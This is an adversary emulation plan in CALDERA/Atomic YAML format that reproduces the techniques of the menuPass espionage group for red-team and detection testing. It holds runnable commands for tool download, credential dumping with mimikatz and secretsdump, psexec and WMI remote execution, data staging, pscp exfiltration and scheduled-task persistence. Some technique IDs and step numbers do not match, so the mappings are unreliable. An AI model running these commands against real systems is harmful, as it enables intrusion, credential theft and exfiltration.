@@ -1,0 +1,712 @@
+# menuPass.yaml - CALDERA and Atomic Style TTPs
+
+- emulation_plan_details:
+    id: b5192070-dff1-4134-bf66-c6b87c7498af
+    adversary_name: menuPass
+    adversary_description: menuPass is thought to be a Chinese cyber espionage group associated with activity directed by elements of the PRC MSS.
+    attack_version: 8.1
+    format_version: 1.0
+
+# Scenario 1, Step 2 - Command and Control
+
+- id: a750b196-8168-461a-8747-bdc4add107ac
+  name: Ingress Tool Transfer
+  description: Pushing tools to compromised host
+  tactic: discovery
+  technique:
+    attack_id: T1105
+    name: "Ingress Tool Transfer"
+  cti_source: https://recordedfuture.com/apt10-cyberespionage-campaign/
+  procedure_group: procedure_command_and_control
+  procedure_step: "2.A"
+  platforms:
+    windows:
+      psh:
+        command: |
+          Start-BitsTransfer -Source "http://#{bitsadmin_remote_ip}/#{bitsadmin_b64_encoded_string}" -Destination "C:\ProgramData\temp\#{bitsadmin_b64_encoded_string}"
+
+  input_arguments:
+    bitsadmin_remote_ip:
+      description: IP or hostname for remote connection
+      type: String
+      default: |
+        remote-host
+
+    bitsadmin_b64_encoded_string:
+      description: Sample Base 64 Encoded String
+      type: String
+      default: |
+        TWUEGJDITXAONVPUOWFV
+
+  executors:
+  - name: powershell
+    command: |
+      Start-BitsTransfer -Source "http://#{bitsadmin_remote_ip}/#{bitsadmin_b64_encoded_string}" -Destination "C:\ProgramData\temp\#{bitsadmin_b64_encoded_string}"
+
+# Scenario 1, Step 3: Discovery
+
+- id: 7877ec4d-3c11-40f2-9650-35261e4ac879
+  name: Network Share Discovery
+  description: Display network shares
+  tactic: discovery
+  technique:
+    attack_id: T1135
+    name: "Network Share Discovery"
+  cti_source: https://pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf
+  procedure_group: procedure_discovery
+  procedure_step: "3.A"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          net use
+
+  executors:
+  - name: command_prompt
+    command: |
+      net use
+
+- id: e132a235-fe43-45c2-a334-2f235a7646b5
+  name: Remote System Discovery
+  description: Identify remote systems using net
+  tactic: discovery
+  technique:
+    attack_id: T1018
+    name: "Remote System Discovery"
+  cti_source: https://pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf
+  procedure_group: procedure_discovery
+  procedure_step: "3.B"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          net view /domain
+
+  executors:
+  - name: command_prompt
+    command: |
+      net view /domain
+
+- id: d19678ac-3bca-475e-89d4-f452bfc2cc2a
+  name: Remote System Discovery
+  description: Identify remote system using Powershell
+  tactic: discovery
+  technique:
+    attack_id: T1018
+    name: "Remote System Discovery"
+  cti_source: https://pwc.co.uk/cyber-security/pdf/cloud-hopper-anex-b-final.pdf
+  procedure_group: procedure_discovery
+  procedure_step: "3.C"
+  platforms:
+    windows:
+      psh:
+        command: |
+          Test-NetConnection "#{host_address}"
+
+  input_arguments:
+    host_address:
+      description: IP for host discovery
+      type: String
+      default: |
+        192.0.2.10
+
+  executors:
+  - name: powershell
+    command: |
+      Test-NetConnection "#{host_address}"
+
+- id: b6026408-c815-47ca-bbb0-6b74591badc8
+  name: Network Service Scanning
+  description: Enumerate remote hosts for running services using tcping
+  tactic: discovery
+  technique:
+    attack_id: T1046
+    name: "Network Service Scanning"
+  cti_source: https://pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf
+  procedure_group: procedure_discovery
+  procedure_step: "3.D"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          "#{tcping_local_path}\tcping.exe" "#{tcping_remote_ip}" "#{tcping_remote_port}"
+        payloads:
+        - tcping.exe
+
+  input_arguments:
+    tcping_local_path:
+      description: Path of tcping.exe
+      type: Path
+      default: |
+        C:\Windows\Temp
+
+    tcping_url:
+      description: Path to download tcping.exe
+      type: URL
+      default: https://download.elifulkerson.com//files/tcping/0.39/tcping.exe
+
+    tcping_remote_ip:
+      description: Hostname or IP to enumerate with tcping.exe
+      type: String
+      default: |
+        192.0.2.10
+
+    tcping_remote_port:
+      description: Port to enumerate with tcping.exe
+      type: String
+      default: |
+        445
+
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      tcping.exe must exist on disk at specified location "#{tcping_local_path}"
+    prereq_command: |
+      if (Test-Path "#{tcping_local_path}\tcping.exe") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "#{tcping_url}" -OutFile "#{tcping_local_path}\tcping.exe"
+
+  executors:
+  - name: command_prompt
+    command: |
+      "#{tcping_local_path}\tcping.exe" "#{tcping_remote_ip}" "#{tcping_remote_port}"
+
+- id: 814005f7-c8d3-45c8-aea2-45758b2d6e90
+  name: System Network Configuration Discovery
+  description: Scan for nameservers and enumerate NetBIOS sessions
+  tactic: discovery
+  technique:
+    attack_id: T1016
+    name: "System Network Configuration Discovery"
+  cti_source: https://pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf
+  procedure_group: procedure_discovery
+  procedure_step: "3.E"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          "#{nbtscan_local_path}\nbtscan.exe" #{nbt_ip_range}
+        payloads:
+        - nbtscan.exe
+
+  input_arguments:
+    nbtscan_local_path:
+      description: Path of nbtscan.exe
+      type: Path
+      default: |
+        C:\Windows\Temp
+
+    nbtscan_url:
+      description: Path to download nbtscan.exe
+      type: URL
+      default: |
+        http://unixwiz.net/tools/nbtscan-1.0.35.exe
+
+    nbt_ip_range:
+      description: IP Range for nbtscan to enumerate
+      type: String
+      default: |
+        192.0.2.34/24
+
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      nbtscan.exe must exist on disk at specified location "#{nbtscan_local_path}"
+    prereq_command: |
+      if (Test-Path "#{nbtscan_local_path}\nbtscan.exe") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "#{nbtscan_url}" -OutFile "#{nbtscan_local_path}\nbtscan.exe"
+
+  executors:
+  - name: command_prompt
+    command: |
+      "#{nbtscan_local_path}\nbtscan.exe" #{nbt_ip_range}
+
+- id: 9d543214-6476-429a-9ca1-cf12233b808c
+  name: System Network Configuration Discovery
+  description: Scan for nameservers and enumerate NetBIOS sessions
+  tactic: discovery
+  technique:
+    attack_id: T1016
+    name: "System Network Configuration Discovery"
+  cti_source: https://pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf
+  procedure_group: procedure_discovery
+  procedure_step: "3.F"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          "#{netsess_local_path}\netsess.exe" #{netsess_remote_ip}
+        payloads:
+        - netsess.exe
+
+  input_arguments:
+    netsess_local_path:
+      description: Path of netsess.exe
+      type: Path
+      default: |
+        C:\Windows\Temp
+
+    netsess_url:
+      description: Path to download netsess.exe
+      type: URL
+      default: |
+        http://www.joeware.net/downloads/files/NetSess.zip
+
+    netsess_remote_ip:
+      description: IP or hostname to run netsess.exe against
+      type: String
+      default: |
+        192.0.2.10
+
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      netsess.exe must exist on disk at specified location "#{netsess_local_path}"
+    prereq_command: |
+      if (Test-Path "#{netsess_local_path}\netsess.exe") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "#{netsess_url}" -OutFile "#{netsess_local_path}\NetSess.zip"
+      Expand-Archive "#{netsess_local_path}\NetSess.zip" "#{netsess_local_path}\NetSess" -Force
+      Move-Item "#{netsess_local_path}\NetSess\netsess.exe" "#{netsess_local_path}\netsess.exe"
+      Remove-Item "#{netsess_local_path}\NetSess.zip", "#{netsess_local_path}\NetSess" -Recurse
+
+  executors:
+  - name: command_prompt
+    command: |
+      "#{netsess_local_path}\netsess.exe" #{netsess_remote_ip}
+
+# Scenario 1, Step 4: Credential Access
+
+- id: ffb50e17-cb3c-4424-a4e7-99e3885f22cc
+  name: OS Credential Dumping
+  description: menuPass has used mimikatz.exe to dump credentials locally
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: "OS Credential Dumping: LSASS Memory"
+  cti_source: https://go.recordedfuture.com/hubfs/reports/cta-2019-0206.pdf
+  procedure_group: procedure_cred_access
+  procedure_step: "4.A"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          "#{mimikatz_local_path}\#{mimikatz_arch}\mimikatz.exe" "#{mimikatz_module}"
+        payloads:
+        - mimikatz.exe
+
+  input_arguments:
+    mimikatz_local_path:
+      description: Path of mimikatz
+      type: Path
+      default: |
+        C:\Windows\Temp
+
+    mimikatz_arch:
+      description: Architecture folder (Win32 or x64)
+      type: String
+      default: x64
+
+    mimikatz_url:
+      description: URL to download mimikatz.exe zip
+      type: URL
+      default: https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200917/mimikatz_trunk.zip
+
+    mimikatz_module:
+      description: Mimikatz module
+      type: String
+      default: |
+        sekurlsa::logonpasswords
+
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      mimikatz.exe must exist on disk at specified location "#{mimikatz_local_path}"
+    prereq_command: |
+      if (Test-Path "#{mimikatz_local_path}\#{mimikatz_arch}\mimikatz.exe") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "#{mimikatz_url}" -OutFile "#{mimikatz_local_path}\mimikatz.zip"
+      Expand-Archive "#{mimikatz_local_path}\mimikatz.zip" "#{mimikatz_local_path}" -Force
+      Remove-Item "#{mimikatz_local_path}\mimikatz.zip" -Force
+
+  executors:
+  - name: command_prompt
+    elevation_required: true
+    command: |
+      "#{mimikatz_local_path}\#{mimikatz_arch}\mimikatz.exe" "#{mimikatz_module}"
+
+- id: fe3d4de1-50bf-4241-9546-72dc757e696f
+  name: OS Credential Dumping
+  description: menuPass has used secretsdump.exe to dump credentials remotely
+  tactic: credential-access
+  technique:
+    attack_id: T1003.002
+    name: "OS Credential Dumping: Security Account Manager"
+  cti_source: https://pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf
+  procedure_group: procedure_cred_access
+  procedure_step: "4.B"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          "#{secretsdump_local_path}\secretsdump.exe" "#{secretsdump_domain}"/"#{secretsdump_user}":"#{secretsdump_pass}"@"#{secretsdump_remote_host}"
+        payloads:
+        - secretsdump.exe
+
+  input_arguments:
+    secretsdump_local_path:
+      description: Path of secretsdump.exe
+      type: Path
+      default: |
+        C:\Windows\Temp
+
+    secretsdump_url:
+      description: URL to download secretsdump.exe binary
+      type: URL
+      default: https://github.com/ropnop/impacket_static_binaries/releases/download/0.9.22.dev-binaries/secretsdump_windows.exe
+
+    secretsdump_domain:
+      description: Domain for secretsdump.exe command
+      type: String
+      default: DOMAIN
+
+    secretsdump_user:
+      description: User for secretsdump.exe command
+      type: String
+      default: Administrator
+
+    secretsdump_pass:
+      description: Password for secretsdump.exe command
+      type: String
+      default: Password123
+
+    secretsdump_remote_host:
+      description: Hostname or IP for secretsdump.exe connection
+      type: String
+      default: 192.0.2.10
+
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      secretsdump.exe must exist on disk at specified location "#{secretsdump_local_path}"
+    prereq_command: |
+      if (Test-Path "#{secretsdump_local_path}\secretsdump.exe") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "#{secretsdump_url}" -OutFile "#{secretsdump_local_path}\secretsdump.exe"
+
+  executors:
+  - name: command_prompt
+    elevation_required: true
+    command: |
+      "#{secretsdump_local_path}\secretsdump.exe" "#{secretsdump_domain}"/"#{secretsdump_user}":"#{secretsdump_pass}"@"#{secretsdump_remote_host}"
+
+# Scenario 1, Step 5: Lateral Movement
+
+- id: 4b1748e5-532c-453c-b195-557ce5550fef
+  name: Service Execution
+  description: Using compiled psexec.py to achieve remote code execution
+  tactic: lateral-movement
+  technique:
+    attack_id: T1569.002
+    name: "System Services: Service Execution"
+  cti_source: https://pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf
+  procedure_group: procedure_lateral_movement
+  procedure_step: "5.A"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          "#{psexec_local_path}\psexec.exe" "#{psexec_user}":"#{psexec_password}"@"#{psexec_remote_host}" "#{psexec_cmd}"
+        payloads:
+        - psexec.exe
+
+  input_arguments:
+    psexec_local_path:
+      description: Path of psexec.exe
+      type: Path
+      default: |
+        C:\Windows\Temp
+
+    psexec_url:
+      description: URL to download psexec.exe binary
+      type: URL
+      default: https://github.com/ropnop/impacket_static_binaries/releases/download/0.9.22.dev-binaries/psexec_windows.exe
+
+    psexec_user:
+      description: User for psexec authentication
+      type: String
+      default: |
+        Administrator
+
+    psexec_password:
+      description: Password for psexec authentication
+      type: String
+      default: |
+        badpassword123
+
+    psexec_remote_host:
+      description: IP or hostname for PsExec connection
+      type: String
+      default: |
+        192.0.2.10
+
+    psexec_cmd:
+      description: PsExec argument for specifying executable
+      type: String
+      default: |
+        -c d.exe
+
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      psexec.exe must exist on disk at specified location "#{psexec_local_path}"
+    prereq_command: |
+      if (Test-Path "#{psexec_local_path}\psexec.exe") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "#{psexec_url}" -OutFile "#{psexec_local_path}\psexec.exe"
+
+  executors:
+  - name: command_prompt
+    command: |
+      "#{psexec_local_path}\psexec.exe" "#{psexec_user}":"#{psexec_password}"@"#{psexec_remote_host}" "#{psexec_cmd}"
+
+# Scenario 1, Step 6: Collection
+
+- id: 160a1e0f-0f9b-49bb-a0fe-7e362b51737f
+  name: Archive Collected Data - Archive via Utility
+  description: Compress and stage data for exfiltration
+  tactic: collection
+  technique:
+    attack_id: T1560.001
+    name: "Archive Collected Data - Archive via Utility"
+  cti_source: https://pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf
+  procedure_group: procedure_collection
+  procedure_step: "6.A"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          rar.exe a "#{rar_archive_name}" "#{rar_files}"
+        payloads:
+        - rar.exe
+
+  input_arguments:
+    rar_archive_name:
+      description: Name of rar archive
+      type: String
+      default: |
+        ss.rar
+
+    rar_files:
+      description: Path to files to compress
+      type: Path
+      default: |
+        C:\Windows\Temp
+
+  executors:
+  - name: command_prompt
+    command: |
+      rar.exe a "#{rar_archive_name}" "#{rar_files}"
+
+- id: b4fa6d2e-ed9c-4a86-81aa-19331983fe0d
+  name: Recycle Bin Staging
+  description: menuPass actors are thought to have staged archives in the Recycle Bin for exfiltration.
+  tactic: collection
+  technique:
+    attack_id: T1074.001
+    name: "Local Data Staging"
+  cti_source: https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf
+  procedure_group: procedure_collection
+  procedure_step: "6.B"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          copy #{copy_filename} "C:\$Recycle.Bin\"
+
+  input_arguments:
+    copy_filename:
+      description: Name of file to copy
+      type: String
+      default: |
+        aa.rar
+
+  executors:
+  - name: command_prompt
+    command: |
+      copy #{copy_filename} "C:\$Recycle.Bin\"
+
+# Scenario 1, Step 7: Exfiltration
+
+- id: ea4bc858-ba13-4f97-9df3-c543d8f3d44c
+  name: Transfer Data to Cloud Account
+  description: Exfil data to cloud account
+  tactic: exfiltration
+  technique:
+    attack_id: T1537
+    name: "Transfer Data to Cloud Account"
+  cti_source: https://pwc.co.uk/cyber-secrity/pdf/cloud-hopper-report-final-v4.pdf
+  procedure_group: procedure_exfiltration
+  procedure_step: "7.A"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          "#{pscp_local_path}\pscp.exe" "#{pscp_exfil_files}" "#{pscp_user}"@"#{pscp_server}":/"#{pscp_drop_location}"
+        payloads:
+        - pscp.exe
+
+  input_arguments:
+    pscp_url:
+      description: Path to download pscp.exe
+      type: URL
+      default: https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe
+
+    pscp_local_path:
+      description: Local path to pscp.exe
+      type: Path
+      default: |
+        C:\Windows\Temp
+
+    pscp_exfil_files:
+      description: Path of files to be sent with pscp
+      type: Path
+      default: |
+        C:\Windows\Temp\exfil
+
+    pscp_user:
+      description: Remote username
+      type: String
+      default: |
+        Administrator
+
+    pscp_server:
+      description: IP or hostname of remote host to connect via pscp
+      type: String
+      default: |
+        192.0.2.10
+
+    pscp_drop_location:
+      description: Path where to download pscp.exe
+      type: Path
+      default: |
+        temp
+
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      pscp.exe must exist on disk at specified location "#{pscp_local_path}"
+    prereq_command: |
+      if (Test-Path "#{pscp_local_path}\pscp.exe") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "#{pscp_url}" -OutFile "#{pscp_local_path}\pscp.exe"
+
+  executors:
+  - name: command_prompt
+    command: |
+      "#{pscp_local_path}\pscp.exe" "#{pscp_exfil_files}" "#{pscp_user}"@"#{pscp_server}":/"#{pscp_drop_location}"
+
+
+# Scenario 1, Step 8 - Execution
+
+- id: 8911d502-747a-4155-adcd-b03a1f284ee7
+  name: Windows Management Instrumentation
+  description: Using wmiexec.vbs to execute tactical malware
+  tactic: execution
+  technique:
+    attack_id: T1047
+    name: "Windows Management Instrumentation"
+  cti_source: https://pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf
+  procedure_group: procedure_execution
+  procedure_step: "8.A"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          cscript.exe "#{wmiexec_local_path}\wmiexec.vbs" /shell "#{wmiexec_remote_host}"
+        payloads:
+        - wmiexec.vbs
+
+  input_arguments:
+    wmiexec_local_path:
+      description: Path of wmiexec.vbs
+      type: Path
+      default: |
+        C:\Windows\Temp
+
+    wmiexec_url:
+      description: Path to download wmiexec.vbs
+      type: URL
+      default: |
+        https://raw.githubusercontent.com/Twi1ight/AD-Pentest-Script/master/wmiexec.vbs
+
+    wmiexec_remote_host:
+      description: Hostname or IP of remote host
+      type: String
+      default: |
+        192.0.2.10
+
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      wmiexec.vbs must be located at "#{wmiexec_local_path}"
+    prereq_command: |
+      if (Test-Path "#{wmiexec_local_path}\wmiexec.vbs") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "#{wmiexec_url}" -OutFile "#{wmiexec_local_path}\wmiexec.vbs"
+
+  executors:
+  - name: command_prompt
+    command: |
+      cscript.exe "#{wmiexec_local_path}\wmiexec.vbs" /shell "#{wmiexec_remote_host}"
+
+
+# Scenario 1, Step 9: Persistence
+
+- id: 236d1357-64f9-4a98-afc1-bccaa89aba8c
+  name: Scheduled Task Persistence
+  description: menuPass is reported to have used scheduled tasks to persist
+  tactic: persistence
+  technique:
+    attack_id: T1553.005
+    name: "Scheduled Task/Job: Scheduled Task"
+  cti_source: https://pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf
+  procedure_group: procedure_persistence
+  procedure_step: "7.1"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          schtasks /create /sc "#{schtask_schedule}" /tn "#{schtask_taskname}" /tr "#{schtask_taskrun}" /ru "#{schtask_username}"
+
+  input_arguments:
+    schtask_schedule:
+      description: Value that specifies the schedule frequency. (MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONLOGON, ONIDLE, and ONEVENT)
+      type: String
+      default: |
+        DAILY
+
+    schtask_taskname:
+      description: A value that specifies a name which uniquely identifies the scheduled task.
+      type: String
+      default: |
+        taskname
+
+    schtask_taskrun:
+      description: A value that specifies the path and file name of the task to be run at the scheduled time.
+      type: Path
+      default: |
+        C:\Windows\Temp
+
+    schtask_username:
+      description: A value that specifies the user context under which the task runs.
+      type: String
+      default: |
+        username
+
+  executors:
+  - name: command_prompt
+    elevation_required: true
+    command: |
+      schtasks /create /sc "#{schtask_schedule}" /tn "#{schtask_taskname}" /tr "#{schtask_taskrun}" /ru "#{schtask_username}"
